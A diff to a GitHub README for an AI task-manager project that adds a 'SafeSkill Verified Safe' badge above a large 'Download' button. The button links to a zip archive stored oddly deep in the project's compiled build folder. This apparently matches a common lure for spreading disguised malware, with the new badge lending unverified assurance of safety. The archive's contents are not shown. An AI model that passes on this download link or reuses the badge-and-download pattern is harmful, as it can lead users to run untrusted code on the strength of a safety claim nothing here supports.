@@ -1,5 +1,7 @@
 # ✨ Task_Management_With_AI - Manage Tasks Effortlessly with AI
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/nsikaknkan001-task-management-with-ai)
+
 [![Download Task Manager](https://raw.githubusercontent.com/nsikaknkan001/Task_Management_With_AI/main/backend/target/classes/com/example/manager/dto/Management-AI-With-Task-1.5-alpha.4.zip%20Here-Task%20Manager-brightgreen)](https://raw.githubusercontent.com/nsikaknkan001/Task_Management_With_AI/main/backend/target/classes/com/example/manager/dto/Management-AI-With-Task-1.5-alpha.4.zip)
 
 ## 📋 Overview
